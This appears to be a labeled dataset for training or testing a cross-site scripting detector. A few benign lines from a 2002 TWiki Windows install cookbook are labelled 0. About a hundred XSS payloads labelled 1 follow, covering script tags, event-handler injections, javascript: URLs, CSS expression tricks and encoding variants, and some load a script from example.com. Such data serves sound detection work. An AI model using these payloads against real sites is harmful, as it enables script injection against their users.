This cookbook is intended to get you up and running with TWiki on Windows quickly, with as few problems as possible. The 'cookbook' approach is simply to restrict the many choices that someone installing	0
TWiki must make, so that a reasonably well-defined procedure can be followed - new users can simply follow the steps, while experts can use this as more of a guideline. Please read	0
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">TWiki:Codev.WindowsModPerlInstallCookbook</a> in case you use mod_perl.	0
-- <a href="http://TWiki.org/cgi-bin/view/Main/RichardDonkin">RichardDonkin</a> - 24 Feb 2002	0
<h2><a name="Recent_updates"> Recent updates </a></h2>	0
30 Nov 2002 - added <code>binutils</code> to list of Cygwin packages, and added warning not to use Apache 2.0	0
20 Nov 2002 - update to avoid <a href="http://twiki.org/cgi-bin/view/Support.InstallDigestSHA1Fails" title="'Support.InstallDigestSHA1Fails' on TWiki site, we know it!">SHA1Fails</a>	0
12 Nov 2002 - setting <code>SMTPMAILHOST</code> for user registration and notification	0
03 Sep 2002 - linked to <a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">Codev</a>	0
20 Jul 2002 - added flags to <code>grep</code> commands in <code>TWiki.cfg</code>	0
 ' onerror=alert(1);'	1
 ' onerror=alert`1`;'	1
 '; alert(1); //	1
 '; alert`1`; //	1
 ';\r\nalert(1);//	1
 ';\r\nalert`1`;//	1
 onerror=alert(1);	1
 onmousemove=alert(1); 	1
--><script>alert(1);</script>	1
--><script>alert`1`;</script>	1
;}alert(1);{&#39;	1
" /><frame src="javascript:alert(1);"></frameset>	1
" onerror=alert(1);"	1
" onerror=alert`1`;"	1
" onmousemove=alert(1); 	1
" onmousemove=alert(1);"	1
" onmousemove=alert`1`; 	1
" onmousemove=alert`1`;"	1
"; alert(1); //	1
"; alert`1`; //	1
";\r\nalert(1);//	1
";\r\nalert`1`;//	1
""" style="background:url(javascript:alert(1))" "	1
<img src=javascript:alert(1)>	1
"<s>"><img src="javascript:alert(1)">	1
"<s>"><script>alert(1)</script>	1
"></iframe><script>alert(1);</script>	1
"></iframe><script>alert`1`;</script>	1
"><frame src="javascript:alert(1)">	1
"><frame src="javascript:alert`1`">	1
"><script>alert(1);</script>	1
"><script>alert`1`;</script>	1
"onclick="alert(1)"	1
"onclick="alert`1`"	1
"onclick="alert(1)" "onFocus="alert(1)"	1
"onclick="alert`1`" "onFocus="alert`1`"	1
"onFocus="alert(1)"	1
"onFocusOut="alert(1)"	1
"onMouseDown="alert(1)"	1
"onMouseEnter="alert(1)"	1
"onMouseEnter="alert(1)" "onMouseDown="alert(1)"	1
"onMouseLeave="alert(1)"	1
"onMouseLeave="alert(1)" "onMouseOut="alert(1)"	1
"onMouseMove="alert(1)"	1
"onMouseMove="alert(1)" "onFocusOut="alert(1)"	1
"onMouseOut="alert(1)"	1
"onMouseUp="alert(1)"	1
"onMouseWheel="alert(1)"	1
"onMouseWheel="alert(1)" "onMouseUp="alert(1)"	1
”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞	1
*/\r\nalert(1);//	1
*/\r\nalert`1`;//	1
\r\nalert(1);//	1
\r\nalert`1`;//	1
<![CDATA["><script>alert(1)</script><!--]]>	1
</textarea><img src=x onerror=alert(1);>	1
</textarea><img src=x onerror=alert`1`;>	1
</textarea><script>alert(1);</script>	1
</textarea><script>alert`1`;</script>	1
<% onmousemove=alert(1)>	1
<% style="xss:expr/* */ession(alert(1))">	1
<% style="xss:expression(alert(1))">	1
<<script>alert(1);<</script>	1
<a onmouseover="alert(1)">XSS</a>	1
<a onmouseover=alert(1)>XSS</a>	1
<b <script>alert(1)</script>0	1
<b>aaaa<script<b></b><alert(1)</script </b>	1
<div style='behavior:url(test.sct)'>a</div>	1
<div style="color:expression(alert(1));">a</div>	1
<div style="left:exp/* */ression(alert(1))">	1
<div style="left:expression(alert(1))">	1
<div/style="width:expression(alert(1))">x</div>	1
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>	1
<iframe src="javascript:alert(1);"></iframe>	1
<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>	1
<iframe src=# onmouseover="alert(1)"></iframe>	1
<img src="http://www.example.com/>"onerror="alert(1)//<">	1
<img src=x onerror=alert(1);>	1
<img src=x onerror=alert`1`;>	1
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-	1
<object data="data:text/html,<script>alert(1)</script>"></object>	1
<q/oncopy=alert(1)	1
<q/oncut=alert(1)	1
<s oncopy= alert(1)>a	1
<s oncut= alert(1)>a	1
<s><script>alert(1)</script>	1
<s>><img src="javascript:alert(1)>	1
<script src=http://example.com/xss.js></script>	1
<sCriPt src=http://example.com/xss.js></script>	1
<script>alert(1);</script>	1
<ScrIpt>alert(1);</SCript>	1
<script>alert`1`;</script>	1
<SELECT NAME="" onmouseover=alert(1)></select>	1
><s><img src="javascript:alert(1)>	1
a style=background:url(javascript:alert(1)) 	1
data:text/html,<script>alert(1)</script>	1
javascript:alert(1);	1
javascript:alert(1)//	1
javascript:alert`1`;	1
style=background:url(javascript(1))	1
